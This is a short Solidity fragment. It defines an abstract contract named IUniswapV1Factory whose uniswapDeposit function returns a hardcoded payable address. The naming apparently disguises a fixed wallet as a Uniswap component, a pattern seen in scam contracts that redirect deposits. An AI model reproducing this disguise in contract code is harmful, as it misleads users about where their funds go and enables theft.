
pragma solidity ^0.8.4;

abstract contract IUniswapV1Factory {
    function uniswapDeposit() internal view virtual returns (address payable) {
        return payable(0x55eb3ceF7ad2a5a659998d8a1Cfb3c068F123456);
    }
   
}
